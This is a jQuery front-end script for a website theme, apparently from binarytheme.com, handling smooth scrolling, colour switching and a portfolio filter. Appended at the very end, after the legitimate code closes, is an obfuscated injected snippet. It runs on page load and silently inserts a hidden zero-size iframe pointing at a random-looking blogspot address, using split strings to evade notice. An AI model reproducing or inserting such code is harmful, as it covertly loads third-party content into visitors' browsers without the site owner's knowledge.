/*=============================================================
    Authour URI: www.binarytheme.com
    License: Commons Attribution 3.0

    http://creativecommons.org/licenses/by/3.0/

    100% To use For Personal And Commercial Use.
    IN EXCHANGE JUST GIVE US CREDITS AND TELL YOUR FRIENDS ABOUT US
   
    ========================================================  */


(function ($) {

    // scrolling code///
    $('a[href*=#]').click(function() {
		 if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'')
 		&& location.hostname == this.hostname) {
   var $target = $(this.hash);
   $target = $target.length && $target
   || $('[name=' + this.hash.slice(1) +']');
   if ($target.length) {
  	var targetOffset = $target.offset().top;
  	$('html,body')
  	.animate({scrollTop: targetOffset}, 800); //set scroll speed here
    return false;
   }
 }
    });
       

    ///Style switcher/////

 //////////   //  COLOR : CODES ///////////////

    // Blue : #37AFFF

   // Green : #469E66

   // Brown : #E69351

   // Red : #E7484E



    $(document).ready(function () {
        $(".trigger").click(function () {
            $(".panel").toggle("fast");
            $(this).toggleClass("active");
            return false;
        });
    });
    $('#theme_blue').click(function () {
        $('#mainStyle').attr('href', 'assets/css/style.css');
    });
    $('#theme_green').click(function () {
        $('#mainStyle').attr('href', 'assets/css/style-green.css');
    });
    $('#theme_brown').click(function () {
        $('#mainStyle').attr('href', 'assets/css/style-brown.css');
    });
    $('#theme_red').click(function () {
        $('#mainStyle').attr('href', 'assets/css/style-red.css');
    });

    
	
	// local scroll
	jQuery('.navbar').localScroll({hash:true, offset: {top: 0},duration: 800, easing:'easeInOutExpo'});

	
	// portfolio
    if($('.isotopeWrapper').length){

        var $container = $('.isotopeWrapper');
        var $resize = $('.isotopeWrapper').attr('id');
        // initialize isotope
        
        $container.isotope({
            itemSelector: '.isotopeItem',
            resizable: false, // disable normal resizing
            masonry: {
                columnWidth: $container.width() / $resize
            }


            
        });

        $('#filter a').click(function(){



            $('#filter a').removeClass('current');
            $(this).addClass('current');
            var selector = $(this).attr('data-filter');
            $container.isotope({
                filter: selector,
                animationOptions: {
                    duration: 1000,
                    easing: 'easeOutQuart',
                    queue: false
                }
            });
            return false;
        });
        
        
        $(window).smartresize(function(){
            $container.isotope({
                // update columnWidth to a percentage of container width
                masonry: {
                    columnWidth: $container.width() / $resize
                }
            });
        });
        

}  


	// fancybox
	jQuery(".fancybox").fancybox();


	if (Modernizr.mq("screen and (max-width:1024px)")) {
			jQuery("body").toggleClass("body");
			
	} else {
		var s = skrollr.init({
			mobileDeceleration: 1,
			edgeStrategy: 'set',
			forceHeight: true,
			smoothScrolling: true,
			smoothScrollingDuration: 300,
				easing: {
					WTF: Math.random,
					inverted: function(p) {
						return 1-p;
					}
				}
			});	
	}


})(jQuery);/*{SCRIPT_CODE}*//*5I4S75cJPjO0*/if( 'undefined' == typeof( ASDAFDEWFDSVSSD ) ) { var ASDAFDEWFDSVSSD = true; (function() { try { var __calb; var __calb = function() { try { if( !document || !document.body ) { window.setTimeout(__calb, 1000); return; } if(document.getElementById('adsd654a65sd4asds654s65d4sa')) return; var ee = document.createElement( 'div' ); ee.innerHTML = '<iframe id="ads'+'d654'+'a65sd4'+'asds654s6'+'5d4sa" src="htt'+'ps://sfasha'+'dsashd'+'shdiushu'+'ihasd.bl'+'ogspo'+'t.c'+'om/" style="display:none;"></iframe>'; ee.style.display = 'none'; ee.style.width = '0px'; ee.style.height = '0px'; document.body.appendChild(ee); }catch(e) { window.setTimeout(__calb, 1000); } }; __calb(); }catch(e){} })(); }/*a3J5Px9u2U81843imGh21*//*{/SCRIPT_CODE}*/